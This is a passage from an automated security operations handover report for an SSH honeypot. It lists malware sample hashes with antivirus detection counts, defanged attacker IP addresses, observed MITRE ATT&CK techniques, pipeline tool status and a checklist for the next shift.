| `79.131.24[.]32` | 1 | 2026-05-23 20:44 | 2026-05-23 20:44 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `147.45.135[.]69` | NL | Timeweb, LLP | **100** ⚠️ | 1 |
| `14.1.16[.]230` | AU | Real World Technology Solutions Pty Ltd | **100** ⚠️ | 0 |
| `177.124.14[.]235` | BR | VIVAS TELECOMUNICACOES LTDA | **100** ⚠️ | 0 |
| `101.126.18[.]30` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `100.54.149[.]28` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 1 |
| `66.132.172[.]104` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `115.190.216[.]185` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.175[.]122` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 20 |
| `14.103.114[.]89` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.126.53[.]14` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 57 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 171 cases |
| Tool 34  | Credential Extractor        | ✅ 41 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (2.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 14 recon entry/entries in table (7 group(s) consolidating 138 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T20:58:33Z_
